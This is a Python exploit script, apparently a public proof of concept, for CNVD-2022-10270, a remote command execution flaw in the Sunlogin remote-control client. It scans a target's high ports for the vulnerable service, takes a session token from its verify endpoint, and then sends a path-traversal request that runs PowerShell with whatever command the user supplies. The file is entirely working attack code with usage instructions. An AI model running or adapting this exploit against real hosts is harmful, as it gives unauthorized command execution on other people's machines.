import sys
import requests
import threading

def head():
    print("""
                   __ _                             ____   ____ _____ 
  ___ _   _ _ __  / _| | _____      _____ _ __     |  _ \ / ___| ____|
 / __| | | | '_ \| |_| |/ _ \ \ /\ / / _ \ '__|____| |_) | |   |  _|  
 \__ \ |_| | | | |  _| | (_) \ V  V /  __/ | |_____|  _ <| |___| |___ 
 |___/\__,_|_| |_|_| |_|\___/ \_/\_/ \___|_|       |_| \_\\____|_____|
                                                    -By:白泽
                                                    --CNVD-2022-10270
""")

def port_scan(port):
    payload1 = f"http://{sys.argv[1]}:{port}"
    try:
        r = requests.get(url = payload1, timeout = 0.3)
        if r.status_code == 200 and r.json()['msg'] == 'Verification failure':
            print(f"\033[92m[{chr(43)}] 存在RCE漏洞IP：{sys.argv[1]}   端口：{port}\033[0m")
    except Exception as e:
        pass

def exploit():
    payload2 = f"http://{sys.argv[1]}:{sys.argv[2]}/cgi-bin/rpc?action=verify-haras"
    r = requests.get(url = payload2, timeout = 0.3)
    CID = r.json()['verify_string']
    try:
        payload3 = f"http://{sys.argv[1]}:{sys.argv[2]}/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+{sys.argv[3]}"
        headers = {
            "Cookie":'CID=' + CID
        }
        r = requests.get(url = payload3, headers = headers)
        print(r.text)
    except Exception as e:
        pass

if __name__=='__main__':

    if len(sys.argv) == 1:    # 无参数返回
        head()
        print("""
Usage: python3 CNVD-2022-10270.py [host] [port] [command]
    python3 CNVD-2022-10270.py 192.168.0.1
    python3 CNVD-2022-10270.py 192.168.0.1 55555 whoami
        """)
    elif len(sys.argv) == 2:    # 输入参数有两个执行端口循环
        for port in range(40000,65535):
            t = threading.Thread(target=port_scan, args=(port,))    # 线程参数
            t.start()   # 线程启动
    else:
        exploit()

